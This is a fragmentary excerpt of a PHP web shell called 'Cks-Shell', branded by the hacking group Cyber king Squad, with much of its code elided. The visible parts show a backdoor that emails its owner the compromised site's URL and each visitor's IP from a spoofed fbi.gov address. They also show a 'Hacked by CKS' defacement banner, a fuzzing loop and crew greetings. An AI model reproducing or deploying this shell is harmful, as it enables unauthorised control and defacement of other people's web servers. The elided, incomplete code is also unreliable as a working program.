...
[]>>>>>>>>> cyber king Squad <<<<<<<<<<
[]========================================
[]+  Telegram: https://t.me/cks_community         +
[]+  Facebook: Cyber king Squad   +
[]========================================
[]
[]
[]
...
$ownerEmail 		= ":)(:"; // Change this to your email , This email is used to deliver tracebacks about your shell
...
function sendLoginAlert()
{
    ...
    $from = "Cks-shell$randomInt@fbi.gov"; 
    
    //echo $from;
    
    if(function_exists('mail'))
    {
        $subject = "Shell Accessed -- Cks-Shell --";
        $message = "
Hey Owner ,
        
        Your Shell(Cks-Shell) located at $url was accessed by $accesedIp
...
<html>
<head>
<title>Cks-Shell | Bangladesh</title>
...
<table>
    <tbody>
        <tr>
            <td width="500px">
        <pre>
<center><a href=><img src=https://c.top4top.io/p_2108ecrrq3.png height=200 width=200 alt="Hacked by CKS" /></a><br>
<font color="#198944">
<b>
[]========================================
[]--------------Cks Shell-----------------
...
else if(isset($_GET['fuzz']))
{
    ...
    )
    {
	   ...
	   for($i=0;$i<$times;$i++)
	   {
        ...
        echo "<script>alert('Fuzzing Completed!By CKS');</script>";
...
(: <a href="https://t.me/cks_community">Follow Team</a> | <a href="https://www.facebook.com/106457414408853">Facebook</a> :)<br>
<font face="courier new" color="#ed68fd" size="7">(Greetz To)</font><br> <font face="courier new" color="#00ff1f"size="6">Rh077king ,RRhax077king,Rhax077king,Dark077Vau,D34TH4X0R,N4Y3M07,D4rk-3y3, and all CKS Members! We'll Always rock <br>Cyber king Squad</font>
</p>
</div>
